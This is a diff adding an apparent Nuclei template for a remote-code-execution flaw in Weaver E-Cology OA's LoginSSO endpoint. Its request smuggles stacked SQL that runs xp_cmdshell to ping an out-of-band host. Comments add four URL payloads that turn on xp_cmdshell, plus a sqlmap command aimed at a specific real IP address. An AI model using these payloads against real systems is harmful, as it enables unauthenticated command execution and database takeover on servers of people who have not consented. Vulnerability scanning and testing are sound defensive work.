@@ -1,0 +1,39 @@
+id: weaver-ecology-loginsso-rce
+
+info:
+  name: 泛微 OA E-Cology loginsso - rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEe-cology9%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3FileDownloadLocation%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: todo
+  tags: weaver,rce,oa,ecology,oob
+
+http:
+  - raw:
+      - |
+        GET /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mailid=0&mrfuuid=1';execute%28%27exe%27%2B%27c%20xp_cm%27%2B%27dshell%20%27%27ping%20-c%201%20{{interactsh-url}}%27%27%27%29--+&a=.swf HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5625.194 Safari/537.36
+    
+    cookie-reuse: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+# 如果 dnslog true，则尝试如下 payload
+# 1. /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mailid=0&mrfuuid=1';execute%28%27exe%27%2B%27c%20sp%27%2B%27_config%27%2B%27ure%20%27%27show%20advanced%20options%27%27%2C%201%3B%27%29--+&a=.swf
+# 2. /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mailid=0&mrfuuid=1';execute%28%27reconfigure%27%29--+&a=.swf
+# 3. /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mailid=0&mrfuuid=1';execute%28%27exe%27%2B%27c%20sp%27%2B%27_config%27%2B%27ure%20%27%27xp_c%27%2B%27mdshell%27%27%2C%201%3B%27%29--+&a=.swf
+# 4. /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mailid=0&mrfuuid=1';execute%28%27reconfigure%27%29--+&a=.swf
+
+# 同时也存在 sql 注入漏洞
+# sqlmap -u "http://8.138.144.172:81/weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mailid=0&mrfuuid=1&a=.swf" --batch --random-agent --dbms=mssql  -p 'mrfuuid' --risk 3 --level 5 --tamper=space2comment
